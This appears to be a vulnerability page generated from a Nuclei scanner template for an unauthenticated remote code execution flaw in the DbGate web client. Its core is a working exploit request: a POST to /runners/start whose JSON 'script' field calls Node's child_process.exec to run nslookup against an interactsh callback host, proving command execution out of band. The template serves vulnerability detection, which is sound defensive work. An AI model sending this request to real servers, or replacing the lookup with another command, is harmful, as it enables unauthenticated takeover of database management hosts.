# Nuclei Template: DbGate Web Client - Unauthenticated Remote Command Execution
**Template ID:** dbgate-unauth-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`dbgate-unauth-rce.yaml`)

## Vulnerability Information & PoC

## Description
DbGate Web Client Management is suspectible to an unauthenticated remote code execution vulnerability.

## Steps to reproduce / Exploit Payload
```http
POST /runners/start HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"script":"process.mainModule.require('child_process').exec('nslookup {{interactsh-url}}')"}
```

## References
- https://github.com/dbgate/dbgate
- https://dbgate.org/docs/env-variables.html
